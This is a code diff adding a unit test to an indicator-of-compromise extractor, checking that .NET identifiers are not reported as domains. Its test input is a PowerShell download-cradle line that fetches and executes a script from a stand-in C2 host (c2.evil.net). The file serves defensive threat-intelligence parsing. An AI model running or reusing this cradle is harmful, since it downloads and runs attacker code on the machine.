@@ -64,3 +64,18 @@ def test_domain_extraction_keeps_cctld_lookalikes():
     domains = extract_iocs("hosts evil.sh and paraguay.py")["domains"]
     assert "evil.sh" in domains
     assert "paraguay.py" in domains
+
+
+def test_domain_extraction_drops_dotnet_code_identifiers():
+    # Download-cradle payloads embed dotted .NET member access that the domain
+    # regex would otherwise flag as bogus two-label domains (net.webclient).
+    text = (
+        "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.net/s.ps1'); "
+        "$c = New-Object Net.HttpWebRequest"
+    )
+    iocs = extract_iocs(text)
+    assert "net.webclient" not in iocs["domains"]
+    assert "net.httpwebrequest" not in iocs["domains"]
+    # The real C2 domain and URL must still be extracted.
+    assert "c2.evil.net" in iocs["domains"]
+    assert "http://c2.evil.net/s.ps1" in iocs["urls"]
